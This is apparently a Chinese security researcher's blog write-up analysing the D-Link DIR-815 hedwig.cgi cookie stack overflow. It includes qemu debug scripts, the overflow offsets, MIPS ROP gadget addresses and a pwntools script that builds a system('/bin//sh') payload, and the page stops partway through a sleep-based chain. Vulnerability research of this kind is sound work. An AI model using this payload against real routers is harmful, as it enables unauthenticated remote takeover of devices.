
<!DOCTYPE html>
<html lang="zh-CN" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DIR815缓冲区溢出漏洞再分析 - pup2y&#39;s world</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="00-前言之前跟着《揭秘家用路由器0day漏洞挖掘技术》调试分析过该漏洞，主要是从qemu用户模式进行分析调试，并没有getshell，在参考了其他师傅的分析文章和帖子后，这次分析增加了qemu系统,"> 
    <meta name="author" content="青云"> 
    <link rel="alternative" href="atom.xml" title="pup2y&#39;s world" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.jpg"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body class="loading">
    <span id="config-title" style="display:none">pup2y&#39;s world</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://pup2y.github.io"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">DIR815缓冲区溢出漏洞再分析</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="article">
    <div class='main'>
        <h1 class="title">DIR815缓冲区溢出漏洞再分析</h1>
        <div class="stuff">
            <span>五月 22, 2020</span>
			
			<span>
   阅读数  <span id="busuanzi_value_page_pv"></span>
</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/dir-815/" rel="tag">dir-815</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/dlink/" rel="tag">dlink</a></li></ul>


        </div>
        <div class="content markdown">
            <h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00-前言"></a>00-前言</h1><p>之前跟着《揭秘家用路由器0day漏洞挖掘技术》调试分析过该漏洞，主要是从qemu用户模式进行分析调试，并没有getshell，在参考了其他师傅的分析文章和帖子后，这次分析增加了qemu系统模式调试,Firmadyne仿真测试以及实体机测试，虽然这次的用户模式还是没能getshell（发这个帖子还是希望有经验的师傅帮忙分析下问题所在），但是其他三种方式都能成功。</p>
<h1 id="01-漏洞介绍"><a href="#01-漏洞介绍" class="headerlink" title="01-漏洞介绍"></a>01-漏洞介绍</h1><blockquote>
<p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
</blockquote>
<p>从漏洞公告中可以看出，该漏洞存在于名为<strong>“hedwig.cgi”</strong>的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个<strong>超长的Cookie值</strong>，使得程序<strong>栈溢出</strong>，从而获得路由器的远程控制权限。</p>
<h1 id="02-调试环境"><a href="#02-调试环境" class="headerlink" title="02-调试环境"></a>02-调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：利用大佬已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>D-Link DIR-815 v1.01路由器实体机：用于测试分析结果</li>
<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></li>
</ul>
<h1 id="03-漏洞定位"><a href="#03-漏洞定位" class="headerlink" title="03-漏洞定位"></a>03-漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/binwalk.png" alt="">  </p>
<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/find-name.png" alt=""></p>
<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_cookie.png" alt=""></p>
<p>可以找到有一个<code>sess_get_uid</code>函数，这个<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析了这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sess_get_uidref.png" alt=""></p>
<p>利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf1.png" alt=""></p>
<p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，如果可以执行到该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容，同样能够达到缓冲区溢出的目的。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf2.png" alt=""></p>
<p>在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建<code>/var/tmp</code>文件夹，就能够到达第二个<code>sprintf</code>函数。我对比了下有无<code>/var/tmp</code>文件夹的返回结果:</p>
<p>无<code>/var/tmp</code>，返回unable to open temp file。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/var-tmp.png" alt=""></p>
<p>有<code>/var/tmp</code>，返回no xml data。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/var-tmp2.png" alt=""></p>
<p>想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml data。因为fopen打开该文件的方式是’w’，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是<code>no xml data</code>，所以利用qemu用户模式这样调试的话，是到不了第二个<code>sprintf</code>函数。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/fopen.png" alt=""></p>
<p>所以漏洞点是第一个<code>sprintf</code>函数，挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点。其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造rop链方法都是一样的。但是对于真实设备而言，就要找到真正的漏洞点在哪。</p>
<h2 id="3-1漏洞重新定位"><a href="#3-1漏洞重新定位" class="headerlink" title="3-1漏洞重新定位"></a>3-1漏洞重新定位</h2><p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank" rel="noopener">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
<p>还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，</p>
<pre class=" language-assembly"><code class="language-assembly">.text:00409AB0                 la      $t9, sobj_strdup
.text:00409AB4                 lw      $a0, 4($s0)
.text:00409AB8                 jalr    $t9 ; sobj_strdup
.text:00409ABC                 nop
.text:00409AC0                 lw      $ra, 0x20+var_4($sp)
.text:00409AC4                 lui     $v1, 0x43  # 'C'
.text:00409AC8                 lw      $gp, 0x20+var_10($sp)
.text:00409ACC                 lw      $s0, 0x20+var_8($sp)
.text:00409AD0                 sw      $v0, haystack
.text:00409AD4                 jr      $ra
.text:00409AD8                 addiu   $sp, 0x20</code></pre>
<p>从而无法申请一个新的堆空间，这样haystack中值将为0，在运行完第一个sprinf之后会进入loc_4096D4，如果haystack为0将则不会进入loc_4096F0分支，进而跳转不了第二个sprintf()。</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096D4 loc_4096D4<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> hedwigcgi_main<span class="token operator">+</span><span class="token number">240</span>j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096D4                 lw      $v0<span class="token punctuation">,</span> haystack
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096DC                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E0</span>                 bnez    $v0<span class="token punctuation">,</span> loc_4096F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E4</span>                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E8</span>                 b       loc_409A64
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096EC                 addiu   $a1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aNoXmlData_ <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">"no xml data."</span></code></pre>
<p>如何使POST数据包中包含”uid=……”，看了大佬们的文章(参考资料里面)还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建’/var/tmp’文件夹。</p>
<h1 id="04-漏洞分析与利用"><a href="#04-漏洞分析与利用" class="headerlink" title="04-漏洞分析与利用"></a>04-漏洞分析与利用</h1><h2 id="4-1-漏洞分析"><a href="#4-1-漏洞分析" class="headerlink" title="4.1-漏洞分析"></a>4.1-漏洞分析</h2><p>hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。   </p>
<p>cgi程序通过getenv的方式获取HTTP数据包中的数据，整个流程应该为:</p>
<p>主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP报文中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</p>
<p>漏洞点sprintf函数</p>
<p>sprintf(栈上的内容,”%s/%s/postxml”,”/runtime/session”,uid的内容)uid的内容是由用户控制的，却没有长度限制，而栈空间有限，hedwigcgi_main同时是一个非叶子函数，那么ra一定存在栈上，我们接下来要做的就是覆盖栈空间内的saved ra达到控制程序流程的目的。</p>
<h2 id="4-2-漏洞利用"><a href="#4-2-漏洞利用" class="headerlink" title="4.2-漏洞利用"></a>4.2-漏洞利用</h2><p>整个漏洞利用过程是</p>
<ul>
<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
<li>确定攻击路径，构造ROP链</li>
<li>编写exp,getshell</li>
</ul>
<h3 id="4-2-1-劫持PC，确定偏移"><a href="#4-2-1-劫持PC，确定偏移" class="headerlink" title="4.2.1-劫持PC，确定偏移"></a>4.2.1-劫持PC，确定偏移</h3><p>利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）</p>
<p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
<pre class=" language-sh"><code class="language-sh">#/bin/bash
test=$(python -c "print 'uid='+open('test','r').read(2000)")
LEN=$(echo -n "$test" | wc -c)
PORT="23957"
cp $(which qemu-mipsel-static) ./qemu
sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
rm -f ./qemu</code></pre>
<p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
<p>使用IDA调试发现运行到hedwigcgi_main()返回时ra寄存器中的值为0x38694237</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra.png" alt=""></p>
<p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
<p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/1043offset.png" alt=""></p>
<p>以上是触发第一个sprintf()的偏移。</p>
<h4 id="4-2-1-1-重新确定偏移"><a href="#4-2-1-1-重新确定偏移" class="headerlink" title="4.2.1.1-重新确定偏移"></a>4.2.1.1-重新确定偏移</h4><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`

INPUT="$1"
COOKIE="$2"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu

echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1"  -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu</code></pre>
<p>执行命令</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
<p>调试之后发现确实能够触发第二个sprintf()。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf3.png" alt=""></p>
<p>并且覆盖了ra=68423668。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra2.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E5%81%8F%E7%A7%BB2.png" alt=""></p>
<p>计算得到偏移为1009。</p>
<h3 id="4-2-2-选择攻击路径构造ROP链"><a href="#4-2-2-选择攻击路径构造ROP链" class="headerlink" title="4.2.2-选择攻击路径构造ROP链"></a>4.2.2-选择攻击路径构造ROP链</h3><h4 id="4-2-2-1-通过system函数getshell"><a href="#4-2-2-1-通过system函数getshell" class="headerlink" title="4.2.2.1-通过system函数getshell"></a>4.2.2.1-通过system函数getshell</h4><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
<p>1.定位system函数地址</p>
<p>首先需要先找到调用了哪个动态链接库libc.so，然后在libc.so中定位system函数。</p>
<p>通过以下过程：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :23957
b *0x409A54 #hedwigcgi_main()函数返回jr ra处
c
vmmap</code></pre>
<p>为了以后不用每次都输入固定的指令可以编写一个dbgscript</p>
<pre class=" language-sh"><code class="language-sh">set architecture mips
set endian little
target remote :23957
b *0x409a54</code></pre>
<p>gdb-multiarch调试的时候执行<code>gdb-multiarch htdocs/cgibin -x dbgscript</code>，-x是指定要执行的命令文件。</p>
<p>得到libuClibc-0.9.30.1.so的基地址为0x76738000。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc-so.png" alt=""></p>
<p>在/lib文件夹下找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/system.png" alt=""></p>
<p>这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。</p>
<p>2.绕过坏字符\x00构造rop链</p>
<p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还到不了sprintf函数，前面的sess_get_uid函数只获取uid=之后\x00字符之前的字符串，进而导致缓冲区溢出失败。所以构造shellcode时需要对system函数的真实地址-1：0x7678b200-1=0x7678b1ff，再寻找gadget将其加1即可。</p>
<p>有了system函数，接下来考虑如何将system函数的第一个参数从栈中拷贝到寄存器a0中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找能将栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，$a0=$(sp+0x10),这样system函数的第一个参数就能从栈中得到了。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/jalrs0.png" alt=""></p>
<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addiu1.png" alt=""></p>
<p>到这里我们需要的gadget就找好，由IDA中的汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%A6%86%E7%9B%96.png" alt=""></p>
<p>所以可以这样构造payload,结构大致如下：</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E6%9E%84%E9%80%A0.png" alt=""></p>
<p>这里参考下H4lo师傅的整个流程图：</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/H4lo.png" alt=""></p>
<p>3.构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>

padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
padding <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
padding <span class="token operator">+=</span> <span class="token string">'/bin//sh'</span>

f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"exploit"</span><span class="token punctuation">,</span><span class="token string">'wb+'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>padding<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>4.测试exp</p>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  'uid=1234' `python -c "print 'uid=' + open('exploit','r').read()"`</code></pre>
<p>使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget1.png" alt=""></p>
<p>之后顺利进入gadget1处(0x76738000+0x159cc=0x7674d9cc)处，将栈上内容(sp+0x10)先加载到s5，并在跳转s0前将s5中内容传给a0。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addius5sp10.png" alt=""></p>
<p>进入system处，a0参数为/bin//sh。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_system.png" alt=""></p>
<p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，而当前$fp的内容为0x0空指针，(fp+0x10处)肯定无法访问。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_system2.png" alt=""></p>
<p>但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。</p>
<h4 id="4-2-2-2-调用sleep-1-函数"><a href="#4-2-2-2-调用sleep-1-函数" class="headerlink" title="4.2.2.2-调用sleep(1)函数"></a>4.2.2.2-调用sleep(1)函数</h4><p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。*<em>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 *</em></p>
<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。 </p>
<p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
<p>1.ROP Gadget 1</p>
<p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/lia0.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x57E50.png" alt=""></p>
<p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
<p>2.ROP Gadget 2</p>
<p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/mipsrop-tail.png" alt=""></p>
<p>选择0x3B8A8作为gadget2。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/3B8A8.png" alt=""></p>
<p>该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话<code>s1=gadget2=0x3B8A8+libc_base</code>，<code>s2 = sleep+libc_base</code>。</p>
<p>sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_sleep.png" alt=""></p>
<p>3.ROP Gadget 3</p>
<p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/mipsrop-stackfinders.png" alt=""></p>
<p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>，gadget3的作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/14F28.png" alt=""></p>
<p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
<p>4.ROP Gadget 4</p>
<p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/movet9s1.png" alt=""></p>
<p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
